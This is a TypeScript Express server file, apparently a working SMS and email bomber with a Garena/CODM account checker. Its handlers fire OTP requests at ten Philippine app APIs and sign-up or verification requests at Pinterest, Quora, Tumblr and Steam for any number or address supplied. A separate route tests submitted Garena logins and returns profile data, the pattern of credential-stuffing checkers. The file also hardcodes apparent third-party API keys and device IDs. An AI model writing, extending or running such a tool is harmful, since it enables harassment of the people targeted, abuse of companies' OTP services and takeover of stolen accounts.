import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import axios from "axios";
import { fileURLToPath } from "url";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import crypto from "crypto";
import CryptoJS from "crypto-js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// --- Garena Logic ---
const GARENA_API = "https://sso.garena.com/api/v1";
const CODM_APP_ID = 100067;

function getPassMd5(password: string): string {
  return crypto.createHash("md5").update(password).digest("hex");
}

function hashPassword(password: string, vcode: string): string {
  const md5Pass = getPassMd5(password);
  return crypto.createHash("md5").update(md5Pass + vcode.toLowerCase()).digest("hex");
}

async function garenaPrelogin(account: string) {
  const res = await axios.get(`${GARENA_API}/prelogin`, {
    params: { account, format: "json" },
    timeout: 10000
  });
  return res.data;
}

async function garenaLogin(account: string, passwordHash: string, vcode: string) {
  const res = await axios.post(`${GARENA_API}/login`, {
    account,
    password: passwordHash,
    vcode,
    format: "json"
  }, { timeout: 10000 });
  return res.data;
}

async function getCodmInfo(garenaAccessToken: string) {
  try {
    // 1. Get CODM app login
    const appLoginRes = await axios.get(`${GARENA_API}/login/app/${CODM_APP_ID}`, {
      params: { access_token: garenaAccessToken, format: "json" },
      timeout: 10000
    });

    if (!appLoginRes.data.callback) return null;

    // 2. Follow callback to get CODM access token
    const callbackRes = await axios.get(appLoginRes.data.callback, { timeout: 10000 });
    const codmAccessToken = callbackRes.data.access_token;

    if (!codmAccessToken) return null;

    // 3. Get CODM user info
    const userInfoRes = await axios.get("https://api.codm.garena.com/v1/user/info", {
      params: { access_token: codmAccessToken },
      timeout: 10000
    });

    return userInfoRes.data;
  } catch (error) {
    console.error("[CODM] Error:", error);
    return null;
  }
}

// --- Services ---
const services = [
  {
    name: "S5.com",
    handler: async (num: string) => {
      const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
      const boundary = "----WebKitFormBoundary" + Math.random().toString(36).slice(2);
      const data = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${formatted}\r\n--${boundary}--\r\n`;
      const res = await axios.post("https://api.s5.com/player/api/v1/otp/request", data, {
        headers: {
          "content-type": `multipart/form-data; boundary=${boundary}`,
          "x-public-api-key": "d6a6d988-e73e-4402-8e52-6df554cbfb35",
        },
        timeout: 10000,
      });
      return res.status;
    },
  },
  {
    name: "Xpress PH",
    handler: async (num: string) => {
      const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
      const res = await axios.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", {
        FirstName: "Test",
        LastName: "User",
        Email: `test${Date.now()}@gmail.com`,
        Phone: formatted,
        Password: "Password123!",
        ConfirmPassword: "Password123!",
        RoleIds: [4],
        FingerprintVisitorId: "TPt0yCuOFim3N3rzvrL1",
      }, { timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "Abenson",
    handler: async (num: string) => {
      const res = await axios.post("https://api.mobile.abenson.com/api/public/membership/activate_otp", 
        `contact_no=${num}&login_token=undefined`, 
        { headers: { "Content-Type": "application/x-www-form-urlencoded" }, timeout: 10000 }
      );
      return res.status;
    },
  },
  {
    name: "Excellente Lending",
    handler: async (num: string) => {
      const res = await axios.post("https://api.excellenteralending.com/dllin/union/rehabilitation/dock", {
        domain: num,
        cat: "login",
        previous: false,
        financial: "efe35521e51f924efcad5d61d61072a9"
      }, {
        headers: {
          "x-package-name": "com.support.excellenteralending",
          "x-adid": "efe35521e51f924efcad5d61d61072a9"
        },
        timeout: 10000
      });
      return res.status;
    },
  },
  {
    name: "FortunePay",
    handler: async (num: string) => {
      const cleanNum = num.startsWith("0") ? num.slice(1) : num;
      const res = await axios.post("https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register", {
        deviceId: "c31a9bc0-652d-11f0-88cf-9d4076456969",
        deviceType: "GOOGLE_PLAY",
        companyId: "4bf735e97269421a80b82359e7dc2288",
        dialCode: "+63",
        phoneNumber: cleanNum
      }, { timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "WeMove",
    handler: async (num: string) => {
      const cleanNum = num.startsWith("0") ? num.slice(1) : num;
      const res = await axios.post("https://api.wemove.com.ph/auth/users", {
        phone_country: "+63",
        phone_no: cleanNum
      }, { timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "LBC",
    handler: async (num: string) => {
      const cleanNum = num.startsWith("0") ? num.slice(1) : num;
      const res = await axios.post("https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification", 
        `verification_type=mobile&client_contact_code=%2B63&client_contact_no=${cleanNum}&app_platform=Android`,
        { headers: { "Content-Type": "application/x-www-form-urlencoded", "api": "LBC", "token": "CONNECT" }, timeout: 10000 }
      );
      return res.status;
    },
  },
  {
    name: "Pickup Coffee",
    handler: async (num: string) => {
      const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
      const res = await axios.post("https://production.api.pickup-coffee.net/v2/customers/login", {
        mobile_number: formatted,
        login_method: "mobile_number"
      }, { headers: { "x-env": "Production", "x-app-version": "2.7.0" }, timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "HoneyLoan",
    handler: async (num: string) => {
      const res = await axios.post("https://api.honeyloan.ph/api/client/registration/step-one", {
        phone: num,
        is_rights_block_accepted: 1
      }, { timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "Komo",
    handler: async (num: string) => {
      const res = await axios.post("https://api.komo.ph/api/otp/v5/generate", {
        mobile: num,
        transactionType: 6
      }, { headers: { "Ocp-Apim-Subscription-Key": "cfde6d29634f44d3b81053ffc6298cba" }, timeout: 10000 });
      return res.status;
    },
  }
];

const emailServices = [
  {
    name: "Pinterest",
    handler: async (email: string) => {
      const res = await axios.post("https://www.pinterest.com/resource/UserRegisterResource/create/", 
        `source_url=%2F&data=%7B%22options%22%3A%7B%22email%22%3A%22${encodeURIComponent(email)}%22%2C%22password%22%3A%22Password123!%22%2C%22age%22%3A%2225%22%7D%2C%22context%22%3A%7B%7D%7D`,
        { headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" }, timeout: 10000 }
      );
      return res.status;
    },
  },
  {
    name: "Quora",
    handler: async (email: string) => {
      const res = await axios.post("https://www.quora.com/api/logged_out_main/send_verification_email", 
        `email=${encodeURIComponent(email)}&verification_type=register`,
        { headers: { "Content-Type": "application/x-www-form-urlencoded" }, timeout: 10000 }
      );
      return res.status;
    },
  },
  {
    name: "Tumblr",
    handler: async (email: string) => {
      const res = await axios.post("https://www.tumblr.com/api/v2/user/sign_up", {
        email: email,
        password: "Password123!",
        tumblelog_name: `user${Date.now()}`
      }, { timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "Steam",
    handler: async (email: string) => {
      const res = await axios.post("https://store.steampowered.com/join/ajaxverifyemail", 
        `email=${encodeURIComponent(email)}&captchagid=-1&captcha_text=&emailauth=&creation_sessionid=`,
        { headers: { "Content-Type": "application/x-www-form-urlencoded" }, timeout: 10000 }
      );
      return res.status;
    },
  }
];

async function startServer() {
  const app = express();
  
  // Anti-DDoS and Security Protection
  app.use(helmet()); // Sets various HTTP headers for security
  
  const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per windowMs
    standardHeaders: true,
    legacyHeaders: false,
    message: { error: "Too many requests, please try again later." }
  });
  
  app.use("/api/", limiter); // Apply rate limiting to all API routes
  
  app.use(express.json());

  // Get available services
  app.get("/api/services", (req, res) => {
    res.json(services.map(s => s.name));
  });

  app.get("/api/email-services", (req, res) => {
    res.json(emailServices.map(s => s.name));
  });

  // Garena Checker API
  app.post("/api/garena/check", async (req, res) => {
    try {
      const { account, password } = req.body;
      if (!account || !password) {
        return res.status(400).json({ error: "Account and password are required" });
      }

      const prelogin = await garenaPrelogin(account);
      if (prelogin.error) {
        return res.json({ status: "FAILED", error: prelogin.error });
      }

      const passwordHash = hashPassword(password, prelogin.vcode);
      const login = await garenaLogin(account, passwordHash, prelogin.vcode);

      if (login.error) {
        return res.json({ status: "FAILED", error: login.error });
      }

      // Check CODM Info
      const codmInfo = await getCodmInfo(login.access_token);

      res.json({ 
        status: "SUCCESS", 
        data: {
          uid: login.uid,
          nickname: login.nickname,
          account: login.account,
          email_status: login.email_status,
          mobile_status: login.mobile_status,
          codm: codmInfo ? {
            nickname: codmInfo.nickname,
            level: codmInfo.level,
            exp: codmInfo.exp
          } : null
        }
      });
    } catch (error: any) {
      const errorMsg = error.response?.data?.error || error.message;
      console.error(`[Garena] Error: ${errorMsg}`);
      res.json({ status: "FAILED", error: errorMsg });
    }
  });

  // Local API handler (matches Netlify Function logic)
  app.post("/api/api", async (req, res) => {
    try {
      const { number, serviceIndex } = req.body;
      console.log(`[API] Request for ${number} using service index ${serviceIndex}`);
      
      const idx = parseInt(serviceIndex);
      const service = services[idx];
      
      if (!service) {
        console.error(`[API] Invalid service index: ${serviceIndex}`);
        return res.status(400).json({ error: `Invalid service index: ${serviceIndex}` });
      }

      const status = await service.handler(number);
      res.json({ name: service.name, status: "SUCCESS", code: status });
    } catch (error: any) {
      console.error(`[API] Service error: ${error.message}`);
      res.json({ status: "FAILED", error: error.message });
    }
  });

  app.post("/api/email", async (req, res) => {
    try {
      const { email, serviceIndex } = req.body;
      console.log(`[Email API] Request for ${email} using service index ${serviceIndex}`);
      
      const idx = parseInt(serviceIndex);
      const service = emailServices[idx];
      
      if (!service) {
        return res.status(400).json({ error: `Invalid service index: ${serviceIndex}` });
      }

      const status = await service.handler(email);
      res.json({ name: service.name, status: "SUCCESS", code: status });
    } catch (error: any) {
      console.error(`[Email API] Service error: ${error.message}`);
      res.json({ status: "FAILED", error: error.message });
    }
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  const PORT = parseInt(process.env.PORT || "3000", 10);
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer();
